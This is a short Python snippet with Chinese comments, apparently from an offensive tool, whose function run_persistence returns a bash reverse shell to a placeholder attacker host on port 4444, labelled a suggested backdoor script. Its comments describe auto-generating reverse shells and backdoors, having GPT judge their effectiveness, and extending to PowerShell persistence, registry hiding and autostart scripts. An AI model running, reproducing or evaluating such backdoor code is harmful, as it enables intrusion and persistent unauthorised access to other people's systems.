def run_persistence(target):
    shell_script = """
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
"""
    return f"[后门建议脚本]\n{shell_script}"


#功能：自动生成反弹 Shell、后门脚本等（交由 GPT 评估安全性和效果）
#可扩展：PowerShell 持久化、注册表隐藏、自启动脚本等

